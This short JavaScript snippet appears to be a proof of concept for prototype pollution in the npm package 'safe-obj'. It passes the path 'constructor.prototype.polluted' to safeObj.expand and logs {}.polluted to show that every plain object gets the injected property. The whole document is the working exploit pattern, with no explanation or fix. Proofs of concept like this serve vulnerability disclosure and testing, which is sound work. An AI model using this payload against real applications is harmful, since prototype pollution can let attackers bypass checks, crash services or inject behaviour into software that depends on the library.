var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
var safeObj = require('safe-obj');
obj = {};
console.log({}.polluted);
safeObj.expand(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);